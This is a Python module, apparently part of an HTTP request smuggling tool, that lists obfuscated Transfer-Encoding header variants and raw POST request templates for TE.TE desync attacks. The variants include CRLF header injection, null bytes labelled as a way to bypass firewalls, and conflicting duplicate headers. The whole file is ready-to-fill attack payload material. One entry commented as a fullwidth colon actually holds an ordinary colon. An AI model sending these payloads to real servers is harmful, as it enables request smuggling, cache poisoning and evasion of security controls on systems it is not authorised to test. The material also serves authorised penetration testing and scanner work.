"""
TE.TE Payload Templates

Both servers use Transfer-Encoding but obfuscation causes one to ignore it.
"""

# Standard TE variants that may cause parsing differences
TE_OBFUSCATIONS = [
    # Whitespace variations
    "Transfer-Encoding: chunked",           # Standard
    "Transfer-Encoding : chunked",          # Space before colon
    "Transfer-Encoding:  chunked",          # Double space after colon
    "Transfer-Encoding:\tchunked",          # Tab after colon
    "Transfer-Encoding: \tchunked",         # Space + tab
    " Transfer-Encoding: chunked",          # Leading space
    "\tTransfer-Encoding: chunked",         # Leading tab
    
    # Case variations
    "transfer-encoding: chunked",           # All lowercase
    "TRANSFER-ENCODING: chunked",           # All uppercase
    "Transfer-Encoding: CHUNKED",           # Uppercase value
    "Transfer-Encoding: ChUnKeD",           # Mixed case value
    
    # Value variations
    "Transfer-Encoding: chunked ",          # Trailing space
    "Transfer-Encoding: chunked\t",         # Trailing tab
    "Transfer-Encoding:chunked",            # No space
    
    # Multiple header tricks
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding: chunked, identity",
    "Transfer-Encoding: identity, chunked",
    
    # Line folding (obsolete but some servers support)
    "Transfer-Encoding:\r\n chunked",       # Line continuation with space
    "Transfer-Encoding:\r\n\tchunked",      # Line continuation with tab
    
    # Header injection attempts
    "Transfer-Encoding: chunked\r\nX-Ignore:",
    "Transfer-Encoding: chunked\r\n\r\n",   # Extra CRLF
    
    # Null byte injection (may bypass WAF)
    "Transfer-Encoding: chunked\x00",
    "Transfer-Encoding:\x00chunked",
    
    # Unicode variations (rarely work but worth trying)
    "Transfer-Encoding: chunked",           # Fullwidth colon
]


# Probe template using obfuscated TE
OBFUSCATION_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
{te_header}

1
Z
Q"""


# Double TE header (different values)
DOUBLE_TE_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

X"""


# TE with junk before value
JUNK_VALUE_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded  
Content-Length: 4
Transfer-Encoding: x]chunked

1
Z
Q"""


# Conflicting TE values
CONFLICTING_TE_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: cow

0

X"""
